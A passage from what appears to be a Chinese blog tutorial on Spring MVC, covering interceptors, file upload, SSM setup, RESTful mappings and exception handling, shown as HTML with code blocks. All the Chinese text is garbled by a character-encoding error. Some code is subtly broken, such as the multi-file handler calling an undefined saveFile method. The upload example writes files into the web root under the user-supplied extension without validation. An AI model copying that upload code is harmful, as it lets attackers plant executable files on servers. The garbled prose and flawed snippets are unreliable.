‡Handleræ‰§è¡Œå®Œæ¯•åè¿›è¡Œçš„æ“ä½œ</p><p><strong>ç»§æ‰¿<code>HandlerInterceptorAdapter</code>æŠ½è±¡ç±»</strong></p><p>è¯¥ç±»æ¥å…¥äº†<code>AsyncHandlerInterceptor</code>æ¥å£ï¼Œè€Œè¯¥æ¥å£æ¥å…¥äº†<code>HandlerInterceptor</code>æ¥å£ï¼Œæ•…æœ¬è´¨ä¸ä¸Šä¸ªæ–¹æ³•æ²¡æœ‰åŒºåˆ«ï¼Œè€Œä¸”è¯¥ç±»ç›®å‰å·²è¢«å¼ƒç”¨ï¼Œä¸å†è¿‡å¤šèµ˜è¿°</p><h4 id="é…ç½®æ‹¦æˆªå™¨"><a href="#é…ç½®æ‹¦æˆªå™¨" class="headerlink" title="é…ç½®æ‹¦æˆªå™¨"></a>é…ç½®æ‹¦æˆªå™¨</h4><p>é€šè¿‡é…ç½®XMLé…ç½®æ–‡ä»¶æ¥è¿›è¡Œæ‹¦æˆªå™¨çš„é…ç½®ï¼Œæœ‰ä¸¤ç§æ–¹æ³•ï¼Œæ–¹æ³•ä¸€</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">mvc:interceptors</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">    ä½¿ç”¨beanå®šä¹‰ä¸€ä¸ªInterceptor</span></span><br><span class="line"><span class="comment">    ç›´æ¥å®šä¹‰åœ¨mvc:interceptorsæ ¹ä¸‹é¢çš„Interceptorå°†æ‹¦æˆªæ‰€æœ‰çš„è¯·æ±‚--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">&quot;path.to.your.interceptor&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">mvc:interceptors</span>&gt;</span></span><br></pre></td></tr></table></figure><p>æ–¹æ³•äºŒ</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">mvc:interceptors</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">mvc:interceptor</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- é€šè¿‡ mvc:mapping é…ç½®éœ€è¦æ‹¦æˆªçš„èµ„æºã€‚æ”¯æŒé€šé…ç¬¦ã€‚å¯é…ç½®å¤šä¸ª --&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- &quot;/**&quot;è¡¨ç¤ºæ‹¦æˆªæ‰€æœ‰çš„è¯·æ±‚ã€‚ --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">mvc:mapping</span> <span class="attr">path</span>=<span class="string">&quot;/**&quot;</span>/&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- é€šè¿‡ mvc:exclude-mapping é…ç½®ä¸éœ€è¦è¢«æ‹¦æˆªçš„èµ„æºã€‚æ”¯æŒé€šé…ç¬¦ã€‚å¯é…ç½®å¤šä¸ª --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">mvc:exclude-mapping</span> <span class="attr">path</span>=<span class="string">&quot;/test/**&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">&quot;path.to.your.interceptor&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">mvc:interceptor</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">mvc:interceptors</span>&gt;</span></span><br></pre></td></tr></table></figure><p>é…ç½®å¤šä¸ªæ‹¦æˆªå™¨</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">mvc:interceptors</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">mvc:interceptor</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">mvc:mapping</span> <span class="attr">path</span>=<span class="string">&quot;/**&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">&quot;path.to.your.interceptor1&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">mvc:interceptor</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">mvc:interceptor</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">mvc:mapping</span> <span class="attr">path</span>=<span class="string">&quot;/**&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">&quot;path.to.your.interceptor2&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">mvc:interceptor</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">mvc:interceptors</span>&gt;</span></span><br></pre></td></tr></table></figure><p>å¤šä¸ªæ‹¦æˆªå™¨çš„æ‰§è¡Œé¡ºåºæ˜¯å…ˆé…ç½®çš„æ‹¦æˆªå™¨çš„<code>preHandle()</code>æ–¹æ³•å…ˆæ‰§è¡Œï¼Œ<code>postHandle()</code>ã€<code>afterCompletion()</code>æ–¹æ³•åæ‰§è¡Œ</p><br/><h2 id="æ–‡ä»¶ä¸Šä¼ "><a href="#æ–‡ä»¶ä¸Šä¼ " class="headerlink" title="æ–‡ä»¶ä¸Šä¼ "></a>æ–‡ä»¶ä¸Šä¼ </h2><h3 id="ç¯å¢ƒé…ç½®"><a href="#ç¯å¢ƒé…ç½®" class="headerlink" title="ç¯å¢ƒé…ç½®"></a>ç¯å¢ƒé…ç½®</h3><p>æ·»åŠ <code>commons-fileupload</code>ä¾èµ–</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-fileupload<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-fileupload<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.3.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>ä¿®æ”¹<code>servlet-context.xml</code>è®¾ç½®ç›¸å…³é…ç½®ï¼Œæ•°å­—çš„å•ä½æ˜¯å­—èŠ‚</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;bean id=<span class="string">&quot;multipartResolver&quot;</span></span><br><span class="line">    class=<span class="string">&quot;org.springframework.web.multipart.commons.CommonsMultipartResolver&quot;</span>&gt;</span><br><span class="line">    &lt;!-- å…è®¸æ–‡ä»¶ä¸Šä¼ çš„æœ€å¤§å°ºå¯¸ --&gt;</span><br><span class="line">    &lt;property name=<span class="string">&quot;maxUploadSize&quot;</span>&gt;</span><br><span class="line">        &lt;value&gt;<span class="number">104857600</span>&lt;/value&gt;</span><br><span class="line">    &lt;/property&gt;</span><br><span class="line">    &lt;!--</span><br><span class="line">    è®¾ç½®æ–‡ä»¶æ”¾å…¥ä¸´æ—¶æ–‡ä»¶å¤¹çš„æœ€å¤§é™åˆ¶</span><br><span class="line">    æ­¤å€¼æ˜¯é˜ˆå€¼ï¼Œä½äºæ­¤å€¼ï¼Œåˆ™ä¿å­˜åœ¨å†…å­˜ä¸­ï¼Œå¦‚é«˜äºæ­¤å€¼ï¼Œåˆ™ç”Ÿæˆç¡¬ç›˜ä¸Šçš„ä¸´æ—¶æ–‡ä»¶</span><br><span class="line">    --&gt;</span><br><span class="line">    &lt;property name=<span class="string">&quot;maxInMemorySize&quot;</span>&gt;</span><br><span class="line">        &lt;value&gt;<span class="number">4096</span>&lt;/value&gt;</span><br><span class="line">    &lt;/property&gt;</span><br><span class="line">&lt;/bean&gt;</span><br></pre></td></tr></table></figure><h3 id="å•æ–‡ä»¶ä¸Šä¼ "><a href="#å•æ–‡ä»¶ä¸Šä¼ " class="headerlink" title="å•æ–‡ä»¶ä¸Šä¼ "></a>å•æ–‡ä»¶ä¸Šä¼ </h3><p><strong>å‰ç«¯è¡¨å•</strong></p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;uploadFile&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span>&gt;</span>æäº¤<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><p><code>type</code>å±æ€§å€¼ä»£è¡¨ä¼ é€’æ–‡ä»¶ï¼Œ<code>enctype</code>å±æ€§å€¼ä»£è¡¨ä»¥äºŒè¿›åˆ¶å½¢å¼ä¼ è¾“æ•°æ®ï¼Œ<code>action</code>å±æ€§å€¼è¡¨ç¤ºåç«¯å¤„ç†çš„è·¯å¾„</p><p><strong>åç«¯å¤„ç†é€»è¾‘</strong></p><p> åç«¯é€šè¿‡<code>MultipartFile</code>è·å¾—æ–‡ä»¶ï¼Œä¹‹åéœ€è®¾ç½®æ–‡ä»¶ä¸Šä¼ è·¯å¾„ï¼Œè¿”å›é¡µé¢æ¸²æŸ“</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/uploadFile&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">uploadFile</span><span class="params">(HttpServletRequest request, <span class="meta">@RequestParam(&quot;file&quot;)</span> MultipartFile file)</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (!file.isEmpty()) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> request.getServletContext().getRealPath(<span class="string">&quot;/&quot;</span>);</span><br><span class="line">            <span class="type">File</span> <span class="variable">uploadFile</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(path + <span class="string">&quot;/upload&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (!uploadFile.exists()) &#123;</span><br><span class="line">                uploadFile.mkdir();</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            <span class="type">String</span> <span class="variable">originalName</span> <span class="operator">=</span> file.getOriginalFilename();</span><br><span class="line">            <span class="type">String</span> <span class="variable">suffix</span> <span class="operator">=</span> originalName.substring(originalName.lastIndexOf(<span class="string">&quot;.&quot;</span>));</span><br><span class="line">            <span class="type">String</span> <span class="variable">fileName</span> <span class="operator">=</span> System.currentTimeMillis() + suffix;</span><br><span class="line">            file.transferTo(<span class="keyword">new</span> <span class="title class_">File</span>(path + <span class="string">&quot;/upload/&quot;</span> + fileName));</span><br><span class="line">            request.setAttribute(<span class="string">&quot;msg&quot;</span>, <span class="string">&quot;æ–‡ä»¶ä¸Šä¼ æˆåŠŸï¼&quot;</span>);</span><br><span class="line">            </span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            request.setAttribute(<span class="string">&quot;msg&quot;</span>, <span class="string">&quot;æ–‡ä»¶ä¸Šä¼ å¤±è´¥ï¼&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        request.setAttribute(<span class="string">&quot;msg&quot;</span>, <span class="string">&quot;æ–‡ä»¶ä¸å­˜åœ¨ï¼&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;result&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ­¤å¤„çš„åç«¯é€»è¾‘è¿˜ä¿®æ”¹çš„ä¸Šä¼ åçš„æ–‡ä»¶åä¸ºç³»ç»Ÿæ¯«ç§’æ—¶</p><h3 id="å¤šæ–‡ä»¶ä¸Šä¼ "><a href="#å¤šæ–‡ä»¶ä¸Šä¼ " class="headerlink" title="å¤šæ–‡ä»¶ä¸Šä¼ "></a>å¤šæ–‡ä»¶ä¸Šä¼ </h3><p><strong>å‰ç«¯è¡¨å•</strong></p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;uploadFile&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;files&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;files&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;files&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span>&gt;</span>æäº¤<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>åç«¯å¤„ç†é€»è¾‘</strong></p><p>åç«¯è·å–æ–‡ä»¶é›†åˆéå†ï¼Œå†ä¾æ¬¡æ‰§è¡Œå‰é¢çš„å¤„ç†é€»è¾‘å³å¯</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/uploadFiles&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">uploadFiles</span><span class="params">(HttpServletRequest request, <span class="meta">@RequestParam(&quot;files&quot;)</span> List&lt;MultipartFile&gt; files)</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (files != <span class="literal">null</span> &amp;&amp; files.size() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (MultipartFile file : files) &#123;</span><br><span class="line">            saveFile(request, file);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;result&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br/><h2 id="SSMæ¡†æ¶é›†æˆ"><a href="#SSMæ¡†æ¶é›†æˆ" class="headerlink" title="SSMæ¡†æ¶é›†æˆ"></a>SSMæ¡†æ¶é›†æˆ</h2><p>SSMæ¡†æ¶æ˜¯Spring + Spring MVC + MyBatisä¸‰ä¸ªå¼€æºæ¡†æ¶çš„æ•´åˆï¼Œæ˜¯Javaä¼ä¸šçº§å¼€å‘ä¸­éå¸¸æµè¡Œçš„è½»é‡çº§æ¡†æ¶ç»„åˆï¼Œä¸»è¦ç”¨äºæ„å»ºWebåº”ç”¨ç¨‹åº</p><h3 id="ç¯å¢ƒé…ç½®-1"><a href="#ç¯å¢ƒé…ç½®-1" class="headerlink" title="ç¯å¢ƒé…ç½®"></a>ç¯å¢ƒé…ç½®</h3><p><strong>é…ç½®pom.xml</strong></p><p>ä¾èµ–é¡¹é…ç½®<code>pom.xml</code>ï¼Œæ­¤å¤„åŒ…æ‹¬<code>junit</code>ã€<code>spring-context</code>ã€<code>spring-test</code>ã€<code>spring-jdbc</code>ã€<code>spring-tx</code>ã€<code>aspectjweaver</code>ã€<code>c3p0</code>ã€<code>mybatis</code>ã€<code>mybatis-spring</code>ã€<code>mysql-connector-java</code>ã€<code>slf4j-log4j</code>ã€<code>pagehelpler</code>ã€<code>spring-web</code>ã€<code>spring-webmvc</code>ã€<code>javax.servlet-api</code>ã€<code>jackson-core</code>ã€<code>commons-fileupload</code>ç­‰ï¼Œç‰ˆæœ¬è¿˜éœ€è¦è‡ªå·±æ–Ÿé…Œ</p><p>Maven é¡¹ç›®ä¸­ï¼Œå¦‚æœæºä»£ç ï¼ˆsrc&#x2F;main&#x2F;javaï¼‰å­˜åœ¨ xmlã€propertiesã€tld ç­‰æ–‡ä»¶ï¼ŒMaven é»˜è®¤ä¸ä¼šè‡ªåŠ¨ç¼–è¯‘è¯¥æ–‡ä»¶åˆ°è¾“å‡ºç›®å½•ï¼Œå¦‚æœè¦ç¼–è¯‘æºä»£ç ä¸­ xmlã€propertiesã€tld ç­‰æ–‡ä»¶ï¼Œéœ€è¦æ˜¾å¼é…ç½® resources æ ‡ç­¾</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">resources</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">resource</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">directory</span>&gt;</span>src/main/resources<span class="tag">&lt;/<span class="name">directory</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">resource</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">resource</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">directory</span>&gt;</span>src/main/java<span class="tag">&lt;/<span class="name">directory</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">includes</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">include</span>&gt;</span>**/*.xml<span class="tag">&lt;/<span class="name">include</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">include</span>&gt;</span>**/*.properties<span class="tag">&lt;/<span class="name">include</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">include</span>&gt;</span>**/*.tld<span class="tag">&lt;/<span class="name">include</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">includes</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filtering</span>&gt;</span>false<span class="tag">&lt;/<span class="name">filtering</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">resource</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">resources</span>&gt;</span></span><br></pre></td></tr></table></figure><p>æ­¤å¤–ï¼Œåé¢è¿˜æœ‰<strong>é…ç½®web.xml</strong>ã€<strong>é…ç½®servlet-content.xml</strong>ã€<strong>é…ç½®spring.xml</strong>ã€<strong>é…ç½®mybatis.xml</strong>ã€<strong>é…ç½®db.properties</strong>ã€<strong>é…ç½®log4j.properties</strong></p><p>å¯ä»¥å‘ç°ï¼ŒåŸç”Ÿspringæ¡†æ¶ä¸‹é…ç½®å·¥ä½œéå¸¸ç¹çï¼Œè¿™ä¿ƒæˆäº†SpringBootçš„äº§ç”Ÿï¼Œå…¶çº¦å®šå¤§äºé…ç½®çš„ç‰¹æ€§æå¤§åœ°å‡å°‘äº†æœºæ¢°æ€§çš„é…ç½®æ“ä½œï¼Œä¸ä¹…æˆ‘ä»¬å°†æ¥è§¦è¿™ä¸€é¢†å…ˆæŠ€æœ¯</p> <br/><h2 id="RestFul-URL"><a href="#RestFul-URL" class="headerlink" title="RestFul URL"></a>RestFul URL</h2><p>RestFul é£æ ¼çš„ API æ˜¯ä¸€ç§è½¯ä»¶æ¶æ„é£æ ¼ï¼Œè®¾è®¡é£æ ¼è€Œä¸æ˜¯æ ‡å‡†ï¼Œåªæ˜¯æä¾›äº†ä¸€ç»„è®¾è®¡åŸåˆ™å’Œçº¦æŸæ¡ä»¶ã€‚å®ƒä¸»è¦ç”¨äºå®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨äº¤äº’ç±»çš„è½¯ä»¶ã€‚åŸºäºè¿™ä¸ªé£æ ¼è®¾è®¡çš„è½¯ä»¶å¯ä»¥æ›´ç®€æ´ï¼Œæ›´æœ‰å±‚æ¬¡ï¼Œæ›´æ˜“äºå®ç°ç¼“å­˜ç­‰æœºåˆ¶</p><p>åœ¨ RESTful é£æ ¼ä¸­ï¼Œç”¨æˆ·è¯·æ±‚çš„ url ä½¿ç”¨åŒä¸€ä¸ª urlï¼Œç”¨è¯·æ±‚æ–¹å¼ï¼š<code>get</code>ã€<code>post</code>ã€<code>delete</code>ã€<code>put</code>ç­‰æ–¹å¼å¯¹è¯·æ±‚çš„å¤„ç†æ–¹æ³•è¿›è¡ŒåŒºåˆ†ï¼Œè¿™æ ·å¯ä»¥åœ¨å‰åå°åˆ†ç¦»å¼çš„å¼€å‘ä¸­ä½¿ç”¨å‰ç«¯å¼€å‘äººå‘˜ä¸ä¼šå¯¹è¯·æ±‚çš„èµ„æºåœ°å€äº§ç”Ÿæ··æ·†å’Œå¤§é‡çš„æ£€æŸ¥æ–¹æ³•åçš„éº»çƒ¦ï¼Œå½¢æˆä¸€ä¸ªç»Ÿä¸€çš„æ¥å£</p><table><thead><tr><th align="left">è¯·æ±‚æ–¹æ³•</th><th align="left">å¯¹åº” SQL æ“ä½œ</th><th align="left">è¯´æ˜</th></tr></thead><tbody><tr><td align="left"><strong>GET</strong></td><td align="left">SELECT</td><td align="left">ä»æœåŠ¡å™¨æŸ¥è¯¢ï¼Œå¯ä»¥é€šè¿‡è¯·æ±‚çš„å‚æ•°åŒºåˆ†æŸ¥è¯¢æ–¹å¼</td></tr><tr><td align="left"><strong>POST</strong></td><td align="left">CREATEï¼ˆINSERTï¼‰</td><td align="left">åœ¨æœåŠ¡å™¨ç«¯æ–°å»ºä¸€ä¸ªèµ„æºï¼Œæ‰§è¡Œæ’å…¥æ“ä½œ</td></tr><tr><td align="left"><strong>PUT</strong></td><td align="left">UPDATE</td><td align="left">åœ¨æœåŠ¡å™¨ç«¯æ›´æ–°èµ„æºï¼ˆé€šå¸¸éœ€è¦æä¾›å®Œæ•´èµ„æºï¼‰ï¼Œæ‰§è¡Œæ›´æ–°æ“ä½œ</td></tr><tr><td align="left"><strong>PATCH</strong></td><td align="left">UPDATE</td><td align="left">åœ¨æœåŠ¡å™¨ç«¯æ›´æ–°èµ„æºï¼ˆå®¢æˆ·ç«¯ä»…æä¾›éœ€è¦æ”¹å˜çš„å±æ€§ï¼‰</td></tr><tr><td align="left"><strong>DELETE</strong></td><td align="left">DELETE</td><td align="left">ä»æœåŠ¡å™¨ç«¯åˆ é™¤èµ„æºï¼Œæ‰§è¡Œåˆ é™¤æ“ä½œ</td></tr></tbody></table><p>æ ¸å¿ƒæ˜¯å°†ä¼ ç»Ÿçš„ä¼ å‚å˜ä¸ºè·¯å¾„ä¼ å‚ï¼Œæ¯”å¦‚<code>?id=1</code>å¯æ”¹å†™ä¸º<code>/1?</code>ï¼ŒSpringMVC æ˜¯é€šè¿‡ <code>@RequestMapping</code>åŠ<code>@PathVariable</code>æ³¨è§£æä¾›çš„ã€‚<code>@PathVariable</code>ä¸€èˆ¬æ ‡è®°åœ¨å½¢å‚å‰</p><h3 id="æŸ¥è¯¢æ“ä½œ"><a href="#æŸ¥è¯¢æ“ä½œ" class="headerlink" title="æŸ¥è¯¢æ“ä½œ"></a>æŸ¥è¯¢æ“ä½œ</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/account/&#123;id&#125;&quot;)</span></span><br><span class="line"><span class="meta">@ResponseBody</span></span><br><span class="line"><span class="keyword">public</span> Account <span class="title function_">queryAccount</span><span class="params">(<span class="meta">@PathVariable</span> Integer id)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> accountService.select(id);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¹Ÿå¯ä»¥å¤šå‚</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/account/&#123;id&#125;/&#123;name&#125;&quot;)</span></span><br><span class="line"><span class="meta">@ResponseBody</span></span><br><span class="line"><span class="keyword">public</span> Account <span class="title function_">queryAccount</span><span class="params">(<span class="meta">@PathVariable</span> Integer id, <span class="meta">@PathVariable</span> String name)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> accountService.select(id,name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="åˆ é™¤æ“ä½œ"><a href="#åˆ é™¤æ“ä½œ" class="headerlink" title="åˆ é™¤æ“ä½œ"></a>åˆ é™¤æ“ä½œ</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@DeleteMapping(&quot;/account/&#123;id&#125;&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">deleteAccountById</span><span class="params">(<span class="meta">@PathVariable</span> Integer id)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> accountService.delete(id);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="æ›´æ–°æ“ä½œ"><a href="#æ›´æ–°æ“ä½œ" class="headerlink" title="æ›´æ–°æ“ä½œ"></a>æ›´æ–°æ“ä½œ</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@PutMapping(&quot;/account/&#123;id&#125;&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">updateAccount</span><span class="params">(<span class="meta">@RequestBody</span> Account account, Integer id)</span> &#123;</span><br><span class="line">    account.setId(id);</span><br><span class="line">    <span class="keyword">return</span> accountService.update(account,id);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="æ·»åŠ æ“ä½œ"><a href="#æ·»åŠ æ“ä½œ" class="headerlink" title="æ·»åŠ æ“ä½œ"></a>æ·»åŠ æ“ä½œ</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@PostMapping(&quot;/account&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">addAccount</span><span class="params">(<span class="meta">@RequestBody</span> Account account)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> accountService.add(account);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br/><h2 id="å…¨å±€å¼‚å¸¸å¤„ç†"><a href="#å…¨å±€å¼‚å¸¸å¤„ç†" class="headerlink" title="å…¨å±€å¼‚å¸¸å¤„ç†"></a>å…¨å±€å¼‚å¸¸å¤„ç†</h2><p>SpringMVC å¯¹äºå¼‚å¸¸å¤„ç†è¿™å—æä¾›äº†æ”¯æŒï¼Œé€šè¿‡ SpringMVC æä¾›çš„å…¨å±€å¼‚å¸¸å¤„ç†æœºåˆ¶ï¼Œèƒ½å¤Ÿå°†æ‰€æœ‰ç±»å‹çš„å¼‚å¸¸å¤„ç†ä»å„å¤„ç†è¿‡ç¨‹è§£è€¦å‡ºæ¥ï¼Œæ—¢ä¿è¯äº†ç›¸å…³å¤„ç†è¿‡ç¨‹çš„åŠŸèƒ½è¾ƒå•ä¸€ï¼Œä¹Ÿå®ç°äº†å¼‚å¸¸ä¿¡æ¯çš„ç»Ÿä¸€å¤„ç†å’Œç»´æŠ¤</p><h3 id="ä½¿ç”¨SimpleMappingExceptionResolverå¯¹è±¡"><a href="#ä½¿ç”¨SimpleMappingExceptionResolverå¯¹è±¡" class="headerlink" title="ä½¿ç”¨SimpleMappingExceptionResolverå¯¹è±¡"></a>ä½¿ç”¨<code>SimpleMappingExceptionResolver</code>å¯¹è±¡</h3><p>é…ç½®æ–‡ä»¶ä¸­é…ç½®å¼‚å¸¸å¤„ç†å¯¹è±¡</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- é…ç½®å…¨å±€å¼‚å¸¸ç»Ÿä¸€å¤„ç†çš„ Bean ï¼ˆç®€å•å¼‚å¸¸å¤„ç†å™¨ï¼‰ --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">&quot;org.springframework.web.servlet.handler.SimpleMappingExceptionResolver&quot;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- é¡µé¢åœ¨è½¬å‘æ—¶å‡ºç°å¼‚å¸¸ï¼Œè®¾ç½®é»˜è®¤çš„é”™è¯¯é¡µé¢ï¼ˆerrorä»£è¡¨çš„æ˜¯ä¸€ä¸ªè§†å›¾ï¼‰ --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;defaultErrorView&quot;</span> <span class="attr">value</span>=<span class="string">&quot;error&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- å¼‚å¸¸å‘ç”Ÿæ—¶ï¼Œè®¾ç½®å¼‚å¸¸çš„å˜é‡å --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;exceptionAttribute&quot;</span> <span class="attr">value</span>=<span class="string">&quot;ex&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span 